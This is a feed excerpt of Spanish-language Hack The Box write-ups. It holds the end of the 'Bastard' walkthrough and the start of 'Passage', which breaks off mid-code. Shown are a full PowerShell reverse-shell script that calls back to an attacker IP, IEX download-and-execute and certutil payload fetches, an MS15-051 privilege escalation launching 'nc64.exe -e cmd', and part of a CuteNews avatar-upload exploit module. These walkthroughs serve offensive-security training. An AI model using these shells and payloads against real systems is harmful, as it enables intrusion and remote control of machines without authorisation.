&lt;p&gt;Para ganar al sistema de manera mas comoda usare el primer metodo, para usando la herramienta &lt;code&gt;nishang&lt;/code&gt; y obtener acceso en una &lt;code&gt;powershell&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1&quot;&gt;https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para matar dos pajaros de un tiro, como es de costumbre añadiremos al final del &lt;code&gt;script&lt;/code&gt; la ejecución del comando que nos otorgue la conexión una vez este se interprete.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;function Invoke-PowerShellTcp 
{ 
    [CmdletBinding(DefaultParameterSetName=&quot;reverse&quot;)] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName=&quot;reverse&quot;)]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName=&quot;bind&quot;)]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=&quot;reverse&quot;)]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=&quot;bind&quot;)]
        [Int]
        $Port,

        [Parameter(ParameterSetName=&quot;reverse&quot;)]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName=&quot;bind&quot;)]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes(&quot;Windows PowerShell running as user &quot; + $env:username + &quot; on &quot; + $env:computername + &quot;`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n&quot;)
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&amp;gt;')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2&amp;gt;&amp;amp;1 | Out-String )
            }
            catch
            {
                Write-Warning &quot;Something went wrong with execution of command on the target.&quot; 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '&amp;gt; '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning &quot;Something went wrong! Check if the server is reachable and you are using the correct port.&quot; 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 443
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos compartimos ahora un servicio web con &lt;code&gt;python&lt;/code&gt; y nos ponemos en escucha por el puerto &lt;code&gt;443&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el script mediante el archivo &lt;code&gt;pwn.php&lt;/code&gt; que subimos previamente y elecutamos &lt;code&gt;Invoke-PowerShellTcp.ps1&lt;/code&gt; con &lt;code&gt;IEX&lt;/code&gt; para que se nos interprete.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Recibimos la petición&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.9 - - [29/Apr/2023 03:34:16] &quot;GET /Invoke-PowerShellTcp.ps1 HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y ganamos acceso en una &lt;code&gt;powershell&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:49349.
Windows PowerShell running as user BASTARD$ on BASTARD
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\drupal-7.54&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos dirigimos al directorio del usuario &lt;code&gt;dimitris&lt;/code&gt; y visiualizamos la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd Desktop
dir


    Directory: C:\Users\dimitris\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         19/3/2017   8:06 ??         32 user.txt                          


type user.txt
ba22fde1932d06eb76a163d312f921a2
PS C:\Users\dimitris\Desktop&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Logramos obtener unas contraseñas en texto claro.&lt;/p&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Usaremos &lt;code&gt;sherlock.ps1&lt;/code&gt; para detectar vias potenciales de escalar privilegios en el &lt;code&gt;kernel&lt;/code&gt;. esta herramienta realiza un proceso similar a herramientas como &lt;code&gt;powerview&lt;/code&gt; y &lt;code&gt;winpeas&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1&quot;&gt;https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Una vez tengamos el &lt;code&gt;script&lt;/code&gt; si filtramos por &lt;code&gt;function&lt;/code&gt;. podemos ver distintas opciones que podemos probar.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat Sherlock.ps1 | grep &quot;function&quot;
function Get-FileVersionInfo ($FilePath) {
function Get-InstalledSoftware($SoftwareName) {
function Get-Architecture {
function Get-CPUCoreCount {
function New-ExploitTable {
function Set-ExploitTable ($MSBulletin, $VulnStatus) {
function Get-Results {
function Find-AllVulns {
function Find-MS10015 {
function Find-MS10092 {
function Find-MS13053 {
function Find-MS13081 {
function Find-MS14058 {
function Find-MS15051 {
function Find-MS15078 {
function Find-MS16016 {
function Find-MS16032 {
function Find-MS16034 {
function Find-CVE20177199 {
function Find-MS16135 {
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Usaremos la opción &lt;code&gt;Find-AllVulns&lt;/code&gt; que me probara todas las opciones. Para ello debemos abrirnos el &lt;code&gt;script&lt;/code&gt; y en la linea final agregar &lt;code&gt;Find-AllVulns&lt;/code&gt;, que hara que al interpretarse el codigo al final llame a esa función.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;        $Build = [int]$VersionInfo[2]
        $Revision = [int]$VersionInfo[3].Split(&quot; &quot;)[0]

        switch ( $Build ) {

            7601 { $VulnStatus = @(&quot;Not Vulnerable&quot;,&quot;Appears Vulnerable&quot;)[ $Revision -lt 23584 ] }
            9600 { $VulnStatus = @(&quot;Not Vulnerable&quot;,&quot;Appears Vulnerable&quot;)[ $Revision -le 18524 ] }
            10240 { $VulnStatus = @(&quot;Not Vulnerable&quot;,&quot;Appears Vulnerable&quot;)[ $Revision -le 16384 ] }
            10586 { $VulnStatus = @(&quot;Not Vulnerable&quot;,&quot;Appears Vulnerable&quot;)[ $Revision -le 19 ] }
            14393 { $VulnStatus = @(&quot;Not Vulnerable&quot;,&quot;Appears Vulnerable&quot;)[ $Revision -le 446 ] }
            default { $VulnStatus = &quot;Not Vulnerable&quot; }

        }

    Set-ExploitTable $MSBulletin $VulnStatus

}

Find-AllVulns
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Compartimos un servicio web con &lt;code&gt;python&lt;/code&gt; nuevamente y interpretamos el script desde la maquina victima con &lt;code&gt;IEX&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;Iex(New-Object Net.WebClient).downloadString('http://10.10.16.3/Sherlock.ps1')

Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que parece ser vulnerable a &lt;code&gt;MS15-051&lt;/code&gt; y para explotarlo usaremos un repositorio en github, del cual podemos descargarnos un archivo &lt;code&gt;zip&lt;/code&gt; que contiene el ejecutable.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051&quot;&gt;https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 Source   ms15-051.exe   ms15-051x64.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Procedemos a subirlo a la maquina victima, para ello usaremos &lt;code&gt;certutil&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;certutil.exe -f -urlcache -split http://10.10.16.3/ms15-051x64.exe ms15-051x64.exe
****  Online  ****
  0000  ...
  d800
CertUtil: -URLCache command completed successfully.

dir

    Directory: C:\WIndows\Temp\Priv


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         29/4/2023   7:04 ??      55296 ms15-051x64.exe
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para ejecutarlo, simplemte debemos pasarle un comando.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;.\ms15-051x64.exe &quot;whoami&quot;
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 1760 created.
==============================
nt authority\system
PS C:\WIndows\Temp\Priv&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Seguidamente para ganar acceso como &lt;code&gt;administrator&lt;/code&gt;, descargaremos &lt;code&gt;ncat&lt;/code&gt; versión &lt;code&gt;1.12&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://eternallybored.org/misc/netcat/&quot;&gt;https://eternallybored.org/misc/netcat/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Una vez lo tengamos, proceremos a subir &lt;code&gt;nc64.exe&lt;/code&gt; a la maquina victima.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 doexec.c   generic.h   getopt.c   getopt.h   hobbit.txt   license.txt   Makefile   nc.exe   nc64.exe   netcat.c   readme.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;certutil.exe -f -urlcache -split http://10.10.16.3/nc64.exe nc64.exe
****  Online  ****
  0000  ...
  b0d8
CertUtil: -URLCache command completed successfully.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez subido el ejecutable, vamos a ejecutarlo de manera privilegiada usando el &lt;code&gt;exploit&lt;/code&gt; y asi obtener una consola interactiva.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;    Directory: C:\Windows\Temp\Priv


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         29/4/2023   7:04 ??      55296 ms15-051x64.exe                   
-a---         29/4/2023   7:15 ??      45272 nc64.exe                          


.\ms15-051x64.exe &quot;C:\Windows\Temp\Priv\nc64.exe -e cmd 10.10.16.3 443&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos y recibimos la conexión como &lt;code&gt;nt authority\system&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:49361.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
nt authority\system

C:\Windows\Temp\Priv&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finalmente nos dirigimos al directorio personal del usuario &lt;code&gt;administrator&lt;/code&gt; y visualizamos la segunda flag &lt;code&gt;root.txt&lt;/code&gt; 😏.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;dir
 Volume in drive C has no label.
 Volume Serial Number is C4CD-C60B

 Directory of C:\Users\Administrator\Desktop

08/02/2022  05:50     &amp;lt;DIR&amp;gt;          .
08/02/2022  05:50     &amp;lt;DIR&amp;gt;          ..
19/03/2017  08:34                 32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   4.134.981.632 bytes free

type root.txt
type root.txt
4bf12b963da1b30cc93496f617f7ba7c
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Fri, 28 Apr 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Bastard</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Bastard</guid>
        
        <category>Drupal Enumeration</category>
        
        <category>Drupal sql RCE</category>
        
        <category>Drupalgeddon2</category>
        
        <category>Drupalgeddon3</category>
        
        <category>Remote Code Execution Drupal</category>
        
        <category>Sherlock Enumeration</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Passage - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo la maquina Passage de &lt;code&gt;hackthebox&lt;/code&gt; que es una maquina &lt;code&gt;Linux&lt;/code&gt; de dificultad &lt;code&gt;Media&lt;/code&gt;. Para explotar esta maquina abusaremos una vulnerabilidad de &lt;code&gt;Cute News&lt;/code&gt; con la que obtendremos ejecución remota de comandos, despues haremos un analisis de codigo de un repositorio publico en github para descubrir ciertos recursos y finalmente para escalar privilegios como el usuario &lt;code&gt;root&lt;/code&gt; nos aprovecharemos de &lt;code&gt;USBCreator&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como de costrumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Passage
❯ ls
 Passage
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeración&quot;&gt;Enumeración &lt;a href=&quot;#enumeración&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeración, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.206
PING 10.10.10.206 (10.10.10.206) 56(84) bytes of data.
64 bytes from 10.10.10.206: icmp_seq=1 ttl=63 time=210 ms

--- 10.10.10.206 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 210.072/210.072/210.072/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde con un &lt;code&gt;ttl&lt;/code&gt; de &lt;code&gt;63&lt;/code&gt; correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;, ahora procederemoscon el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.206 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-17 16:25 GMT
Initiating SYN Stealth Scan at 16:25
Scanning 10.10.10.206 [65535 ports]
Discovered open port 22/tcp on 10.10.10.206
Discovered open port 80/tcp on 10.10.10.206
Completed SYN Stealth Scan at 16:25, 16.83s elapsed (65535 total ports)
Nmap scan report for 10.10.10.206
Host is up, received user-set (0.12s latency).
Scanned at 2023-04-17 16:25:13 GMT for 17s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.00 seconds
           Raw packets sent: 82801 (3.643MB) | Rcvd: 82648 (3.306MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de realizarse el escaneo vemos que los puertos abiertos corresponden a  &lt;code&gt;22 ssh&lt;/code&gt; , &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80 10.10.10.206 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-17 16:27 GMT
Nmap scan report for 10.10.10.206
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Passage News
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.80 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visulizamos la versión de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.2p2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.18&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Primeramente ya que &lt;code&gt;nmap&lt;/code&gt; nos reporto que el puerto &lt;code&gt;80&lt;/code&gt; se encuentra abiertos usaremos &lt;code&gt;whatweb&lt;/code&gt; para tratar identificar a que nos estamos enfrentando y ver el gestor de contenido web desde consola.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.206
http://10.10.10.206 [200 OK] Apache[2.4.18], Bootstrap, Cookies[CUTENEWS_SESSION], Country[RESERVED][ZZ], Email[kim@example.com,nadav@passage.htb,paul@passage.htb,sid@example.com], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.206], JQuery, PoweredBy[CuteNews:], Script[text/javascript], Title[Passage News]
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cutenews: CuteNews es un gestor de noticias/sistema de publicación blog, creado por el equipo de desarrolladores de CutePHP&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;La herramienta nos reporta que se esta usando el gestor de contenido correspondiente a &lt;code&gt;Cutenews&lt;/code&gt;, ademas vemos que se puede estar aplicando virtual hosting. Por lo que procederemos a agregar el dominio a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.206 passage.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a proceder a abrir el servicio web en el navegador&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A primera vista no vemos algo muy relevante asi que probaremos a ver el codigo fuente de la pagina.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Visualizamos que existe una ruta de nombre &lt;code&gt;CuteNews&lt;/code&gt; y tenemos capacidad de acceso a la ruta que concretamente se trata de un panel de login.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Encontramos algo muy interesante en el panel de login ya que podemos ver la versión de &lt;code&gt;CuteNews&lt;/code&gt; que se esta utilizando.&lt;/p&gt;

&lt;p&gt;Verificamos si hay algun exploit publico &lt;code&gt;searchsploit&lt;/code&gt; y efectivamente existen vulnerabilidades asociadas a esta versión especifica &lt;code&gt;2.1.2&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit cutenews 2.1.2
------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                                                           | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                                                                                               | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                                                   | php/webapps/48458.txt
CuteNews 2.1.2 - Remote Code Execution                                                                                                 | php/webapps/48800.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tenemos exploits que corresponden a &lt;code&gt;RCE&lt;/code&gt;, el primero de ellos nos habla de algo asociado con &lt;code&gt;avatar&lt;/code&gt;, podemos investigar de que trata el exploit trayendonoslo a nuestro directorio. Pero primero recordemos que en el panel de login, existia la opción de registrar un nuevo usuario.&lt;/p&gt;

&lt;p&gt;Procedamos a registrarnos en el servicio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez registrados, obervamos en nuestro panel un campo correspondiente a &lt;code&gt;avatar&lt;/code&gt;, y si recordamos antes vimos un &lt;code&gt;exploit&lt;/code&gt; asociado que justamente nos hablaba de algo de &lt;code&gt;avatar&lt;/code&gt;. Quiero pensar entonces que al este campo corrsponder a una subida de archivos, entonces la &lt;code&gt;RCE&lt;/code&gt; en el exploit la obtiene de un mal control en la subida de archivos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para estar seguros podemos examinar el exploit y ver que que trata.&lt;/p&gt;

&lt;p&gt;Efectivamente dentro encontramos una función que lo que hace es realizar una petición en &lt;code&gt;avatar&lt;/code&gt; subiendo un arhivo &lt;code&gt;php&lt;/code&gt; que incluye una cabecera &lt;code&gt;GIF&lt;/code&gt; y de Content-Type &lt;code&gt;image/png&lt;/code&gt;: esto para mediante el uso de &lt;code&gt;Magic Numbers&lt;/code&gt; hacer un &lt;code&gt;bypass&lt;/code&gt; aprovechando la mala sanitización en el campo de subida y este nos detecte el archivo como un &lt;code&gt;GIF&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-ruby&quot;&gt;def upload_shell(cookie, check)

    res = send_request_cgi({
      'method'   =&amp;gt; 'GET',
      'uri'      =&amp;gt; normalize_uri(target_uri.path, &quot;index.php?mod=main&amp;amp;opt=personal&quot;),
      'cookie'   =&amp;gt; cookie
    })

    signkey = res.body.split('__signature_key&quot; value=&quot;')[1].split('&quot;')[0]
    signdsi = res.body.split('__signature_dsi&quot; value=&quot;')[1].split('&quot;')[0]
    # data preparation
    fname = Rex::Text.rand_text_alpha_lower(8) + &quot;.php&quot;
